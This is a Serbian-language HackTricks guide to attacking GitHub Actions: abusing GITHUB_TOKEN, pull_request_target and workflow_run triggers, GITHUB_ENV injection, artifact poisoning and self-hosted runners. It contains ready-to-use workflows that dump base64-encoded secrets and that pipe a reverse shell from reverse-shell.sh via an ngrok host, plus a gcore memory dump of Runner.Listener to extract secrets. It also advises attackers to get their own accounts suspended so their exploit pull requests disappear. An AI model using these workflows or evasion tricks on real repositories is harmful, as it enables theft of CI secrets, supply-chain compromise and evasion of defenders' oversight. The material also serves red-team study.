# Zloupotreba Github akcija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Na ovoj stranici ćete pronaći:

* **Rezime svih uticaja** koje napadač može imati ako pristupi Github akciji
* Različite načine za **pristup akciji**:
* Imajući **dozvole** za kreiranje akcije
* Zloupotreba **okidača vezanih za pull zahtev** 
* Zloupotreba **drugih spoljnih pristupačnih tehnika**
* **Pivotiranje** iz već kompromitovanog repozitorijuma
* Na kraju, sekcija o **tehnikama post-eksploatacije za zloupotrebu akcije iznutra** (uzrokujući pomenute uticaje)

## Rezime uticaja

Za uvod o [**Github akcijama proverite osnovne informacije**](../basic-github-information.md#github-actions).

U slučaju da možete **izvršiti proizvoljne Github akcije/ubaciti kod** u **repozitorijum**, možete:

* **Ukrasti** **tajne** iz tog repozitorijuma/organizacije.
* Ako možete samo ubaciti, možete ukrasti sve što je već prisutno u radnom toku.
* Zloupotrebiti **privilegije repozitorijuma** da pristupite drugim platformama poput AWS-a i GCP-a.
* **Izvršiti kod u prilagođenim radnicima** (ako se koriste prilagođeni radnici) i pokušati pivotirati odande.
* **Prepisati** kod repozitorijuma.
* Ovo zavisi od privilegija `GITHUB_TOKEN`-a (ako ih ima).
* **Kompromitovati** **implementacije** i druge **artefakte**.
* Ako kod implementira ili čuva nešto, možete to izmeniti i dobiti dodatni pristup.

## GITHUB\_TOKEN

Ovaj "**tajni**" token (dolazi od `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) dodeljuje se kada administrator omogući ovu opciju:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti onaj koji će koristiti **Github aplikacija**, tako da može pristupiti istim endpointima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github bi trebalo da objavi [**protokol**](https://github.com/github/roadmap/issues/74) koji **omogućava pristup preko repozitorijuma** unutar GitHub-a, tako da repozitorijum može pristupiti drugim internim repozitorijumima koristeći `GITHUB_TOKEN`.
{% endhint %}

Možete videti moguće **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Imajte na umu da token **ističe nakon završetka posla**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neki zanimljivi stvari koje možete uraditi sa ovim tokenom:

{% tabs %}
{% tab title="Spoji PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Odobri PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Napravi PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Imajte na umu da ćete u nekoliko situacija moći pronaći **github korisničke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu pružiti veće privilegije nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Lista tajni u Github Action output-u</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Get obrnuti shell pomoću tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole date Github Token-u u repozitorijumima drugih korisnika **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljena Izvršenja

{% hint style="info" %}
Ovo bi bio najlakši način da se kompromituju Github akcije, jer ovaj slučaj podrazumeva da imate pristup **kreiranju novog repozitorijuma u organizaciji**, ili imate **privilegije pisanja nad repozitorijumom**.

Ukoliko se nalazite u ovom scenariju, možete proveriti [tehnike post eksploatacije](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Izvršenje iz Kreiranja Repozitorijuma

U slučaju da članovi organizacije mogu **kreirati nove repozitorijume** i možete izvršavati github akcije, možete **kreirati novi repozitorijum i ukrasti tajne postavljene na nivou organizacije**.

### Izvršenje iz Nove Grane

Ukoliko možete **kreirati novu granu u repozitorijumu koji već sadrži konfigurisanu Github akciju**, možete je **modifikovati**, **uploadovati** sadržaj, a zatim **izvršiti tu akciju iz nove grane**. Na ovaj način možete **eksfiltrirati tajne na nivou repozitorijuma i organizacije** (ali morate znati kako se zovu).

Možete napraviti modifikovanu akciju izvršivom **ručno**, kada je **kreiran PR** ili kada je **neki kod pushovan** (zavisno od toga koliko želite da budete primetni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Izvršenje preko Fork-a

{% hint style="info" %}
Postoje različiti okidači koji bi omogućili napadaču da **izvrši Github akciju druge repozitorijume**. Ako su ove akcije koje se mogu okinuti loše konfigurisane, napadač bi mogao da ih kompromituje.
{% endhint %}

### `pull_request`

Okidač radnog toka **`pull_request`** će izvršiti radni tok svaki put kada se primi zahtev za povlačenje sa nekim izuzecima: podrazumevano, ako je to **prvi put** da **sarađujete**, neki **održavač** će morati da **odobri** **pokretanje** radnog toka:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kako je **podrazumevano ograničenje** za **prvi put** saradnici, možete doprineti **ispravljajući validan bug/štamparsku grešku** a zatim poslati **druge PR-ove da zloupotrebite svoje nove privilegije `pull_request`**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da napravite nalog sa imenom osobe koja je doprinela projektu i obrisala svoj nalog.~~
{% endhint %}

Osim toga, podrazumevano **sprečava dozvole za pisanje** i **pristup tajnama** ciljnom repozitorijumu kako je navedeno u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Osim `GITHUB_TOKEN`, **tajne se ne prenose na izvršioca** kada se radni tok pokrene iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima dozvole samo za čitanje** u zahtevima za povlačenje **iz forkovanih repozitorijuma**.

Napadač bi mogao da izmeni definiciju Github akcije kako bi izvršio proizvoljne stvari i dodao proizvoljne akcije. Međutim, neće moći da ukrade tajne ili prepisuje repozitorijum zbog navedenih ograničenja.

{% hint style="danger" %}
**Da, ako napadač promeni u PR-u github akciju koja će biti okinuta, njegova Github akcija će biti korišćena umesto one iz originalnog repozitorijuma!**
{% endhint %}

Pošto napadač takođe kontroliše izvršeni kod, čak i ako nema tajni ili dozvola za pisanje na `GITHUB_TOKEN`, napadač bi na primer mogao da **učita zlonamerne artefakte**.

### **`pull_request_target`**

Okidač radnog toka **`pull_request_target`** ima **dozvolu za pisanje** u ciljnom repozitorijumu i **pristup tajnama** (i ne traži dozvolu).

Imajte na umu da okidač radnog toka **`pull_request_target`** **radi u osnovnom kontekstu** a ne u onom datom od strane PR-a (da **ne izvršava nepoverljiv kod**). Za više informacija o `pull_request_target` [**proverite dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Osim toga, za više informacija o ovoj specifičnoj opasnoj upotrebi proverite ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Možda izgleda da je zato što se **izvršeni radni tok** definiše u **osnovnom** a ne u PR-u **sigurno** koristiti **`pull_request_target`**, ali postoje **slučajevi kada nije**.

I ovaj će imati **pristup tajnama**.

### `workflow_run`

Okidač [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omogućava pokretanje radnog toka iz drugog kada je `završen`, `zatražen` ili `u toku`.

U ovom primeru, radni tok je konfigurisan da se pokrene nakon što zaseban radni tok "Pokreni testove" završi:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Osim toga, prema dokumentaciji: Radni tok pokrenut događajem `workflow_run` može **pristupiti tajnama i pisati tokenima, čak i ako prethodni radni tok to nije uradio**.

Ovaj tip radnog toka može biti napadnut ako **zavisi** od **radnog toka** koji može biti **pokrenut** od strane spoljnog korisnika putem **`pull_request`** ili **`pull_request_target`**. Par ranjivih primera može se **pronaći u ovom blogu**. Prvi primer podrazumeva da **`workflow_run`** pokrenuti radni tok preuzima kod napadača: `${{ github.event.pull_request.head.sha }}`\
Drugi primer podrazumeva **prosljeđivanje** artefakta iz **nepoverljivog** koda u **`workflow_run`** radni tok i korišćenje sadržaja ovog artefakta na način koji ga čini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvršava iz `pull_request` koda koji se koristi/preuzima dolazi iz originala ili iz forkovanog PR-a

## Zloupotreba Forkovanog Izvršenja

Pomenuli smo sve načine na koje spoljni napadač može naterati github radni tok da se izvrši, sada pogledajmo kako ova izvršenja, ako su loše konfigurisana, mogu biti zloupotrebljena:

### Izvršenje nepoverljivog čekauta

U slučaju **`pull_request`,** radni tok će biti izvršen u **kontekstu PR-a** (tako da će izvršiti **zlonamerni kod PR-ova**), ali neko mora **autorizovati prvo** i izvršiće se sa nekim [ograničenjima](./#pull\_request).

U slučaju radnog toka koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od radnog toka koji može biti pokrenut iz **`pull_request_target` ili `pull_request`** biće izvršen kod iz originalnog repozitorijuma, tako da **napadač ne može kontrolisati izvršeni kod**.

{% hint style="danger" %}
Međutim, ako **akcija** ima **eksplicitan PR čekaut** koji će **preuzeti kod iz PR-a** (a ne iz baze), koristiće se kod koji kontroliše napadač. Na primer (proverite liniju 12 gde je preuzet PR kod):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. Dato samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepoverljiv kod se izvršava tokom `npm install` ili `npm build`** jer su skripte za izgradnju i referisani **paketi kontrolisani od strane autora PR-a**.

{% hint style="warning" %}
Github dork za pretragu ranjivih akcija je: `event.pull_request pull_request_target extension:yml` međutim, postoje različiti načini konfigurisanja poslova da se izvrše sigurno čak i ako je akcija konfigurisana nesigurno (kao što je korišćenje uslova o tome ko je akter koji generiše PR).
{% endhint %}

### Umetanja Skriptova u Kontekst <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje određeni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije vrednosti kontroliše **korisnik** koji kreira PR. Ako github akcija koristi te **podatke za izvršavanje bilo čega**, to može dovesti do **izvršavanja proizvoljnog koda:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Umetanje Skriptova** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Prema dokumentaciji: Možete omogućiti **promenljivu okruženja dostupnu za sve naredne korake** u radnom toku definisanjem ili ažuriranjem promenljive okruženja i upisivanjem u datoteku okruženja **`GITHUB_ENV`**.

Ako napadač može **ubaciti bilo koju vrednost** unutar ove **env** promenljive, može ubaciti env promenljive koje mogu izvršiti kod u sledećim koracima kao što su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovde**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovde**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite radni tok koji veruje učitanom artefaktu da sačuva njegov sadržaj unutar **`GITHUB_ENV`** env promenljive. Napadač bi mogao učitati nešto poput ovoga da ga kompromituje:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Ranjive Github Akcije Trećih Strana

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao što je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Akcija omogućava pristup artefaktima iz različitih radnih tokova čak i repozitorijuma.

Problem je u tome što ako parametar **`path`** nije postavljen, artefakt se izvlači u trenutnom direktorijumu i može prebrisati datoteke koje bi kasnije mogle biti korišćene ili čak izvršene u radnom toku. Stoga, ako je Artefakt ranjiv, napadač bi mogao iskoristiti ovo da kompromituje druge radne tokove koji veruju Artefaktu.

Primer ranjivog radnog toka:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto ovim radnim tokom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ostali spoljni pristupi

### Preuzimanje repozitorijuma izbrisanih imena prostora

Ako korisnički nalog promeni svoje ime, drugi korisnik može registrovati nalog sa tim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github će dozvoliti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj koji je obrisan.

{% hint style="danger" %}
Dakle, ako akcija koristi repozitorijum koji pripada neaktivnom nalogu, još uvek je moguće da napadač može kreirati taj nalog i ugroziti akciju.
{% endhint %}

Ako su drugi repozitorijumi koristili **zavisnosti iz ovih korisničkih repozitorijuma**, napadač će moći da ih preuzme. Ovde imate detaljnije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Preusmeravanje repozitorijuma

{% hint style="info" %}
U ovoj sekciji ćemo govoriti o tehnikama koje bi omogućile **preusmeravanje sa jednog repozitorijuma na drugi** pretpostavljajući da imamo neki vid pristupa prvom (proverite prethodnu sekciju).
{% endhint %}

### Trovanje keša

Keš se održava između **tokova rada u istoj grani**. To znači da ako napadač **ugrozi** **paket** koji se zatim čuva u kešu i **preuzme** i izvrši ga neki **privilegovani** tok rada, moći će takođe da **ugrozi** i taj tok rada.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje artefaktima

Tokovi rada mogu koristiti **artefakte iz drugih tokova rada i čak repozitorijuma**, ako napadač uspe da **ugrozi** Github akciju koja **dodaje artefakt** koji se kasnije koristi u drugom toku rada, može **ugroziti druge tokove rada**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post eksploatacija iz akcije

### Pristup AWS i GCP putem OIDC

Proverite sledeće stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u skriptu, korisno je znati kako možete pristupiti tajnama:

* Ako je tajna ili token postavljen kao **promenljiva okruženja**, može se direktno pristupiti kroz okruženje koristeći **`printenv`**.

<details>

<summary>Izlistaj tajne u izlazu Github akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Get obrnuti shell pomoću tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript je smešten **na disku** i pristupačan je.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript akcije tajne se šalju kroz okružne promenljive
* ```bash
ps axe | grep node
```
* Za **prilagođenu akciju**, rizik može varirati u zavisnosti od toga kako program koristi tajnu koju je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba Samostalnih runner-a

Način da se otkrije koje **Github akcije se izvršavaju na infrastrukturi koja nije Github** je pretraga za **`runs-on: self-hosted`** u konfiguraciji yaml Github akcije.

**Samostalni** runner-i mogu imati pristup **dodatno osetljivim informacijama**, drugim **mrežnim sistemima** (ranjivim tačkama na mreži? servisima metapodataka?) ili, čak i ako je izolovan i uništen, **više akcija može se izvršavati istovremeno** i zlonamerna akcija bi mogla **ukrasti tajne** druge akcije.

Na samostalnim runner-ima takođe je moguće dobiti **tajne iz \_Runner.Listener**\_\*\* procesa\*\* koji će sadržati sve tajne radnih tokova u bilo kom koraku tako što će isprazniti svoju memoriju:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Proverite [**ovaj post za više informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Moguće je napraviti Github akcije koje će **izgraditi i sačuvati Docker sliku unutar Github-a**.\
Primer možete pronaći u sledećem proširivom:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što možete videti u prethodnom kodu, Github registar je smešten na **`ghcr.io`**.

Korisnik sa dozvolama za čitanje nad repozitorijumom će moći da preuzme Docker Image koristeći lični pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik može tražiti **procurene tajne u slojevima Docker slike:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u zapisima Github akcija

Čak i ako **Github** pokušava da **detektuje tajne vrednosti** u zapisima akcija i **izbegne njihovo prikazivanje**, **druge osetljive podatke** koji su mogli biti generisani prilikom izvršenja akcije neće biti sakriveni. Na primer, JWT potpisan tajnom vrednošću neće biti sakriven osim ako nije [posebno konfigurisan](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Pokrivanje tragova

(Tehnika sa [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki podneti PR je jasno vidljiv javnosti na Githubu i ciljnom GitHub nalogu. Na GitHubu podrazumevano, **ne možemo obrisati PR sa interneta**, ali postoji preokret. Za Github naloge koji su **suspendovani** od strane Githuba, svi njihovi **PR-ovi automatski se brišu** i uklanjaju sa interneta. Dakle, kako biste sakrili svoje aktivnosti, morate ili dobiti **suspendovan GitHub nalog ili označiti svoj nalog**. Ovo bi **sakrilo sve vaše aktivnosti** na GitHubu sa interneta (u osnovi uklonilo bi sve vaše eksploatacije PR-ove)

Organizacija na GitHubu veoma proaktivno prijavljuje naloge GitHubu. Sve što treba da uradite je da podelite "neke stvari" u Problemu i oni će se pobrinuti da vaš nalog bude suspendovan za 12 sati :p i eto, učinili ste svoju eksploataciju nevidljivom na githubu.

{% hint style="warning" %}
Jedini način za organizaciju da shvati da su meta napada je da proveri GitHub zapise iz SIEM-a jer sa GitHub UI PR bi bio uklonjen.
{% endhint %}

## Alati

Sledeći alati su korisni za pronalaženje Github akcija i čak pronalaženje ranjivih:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
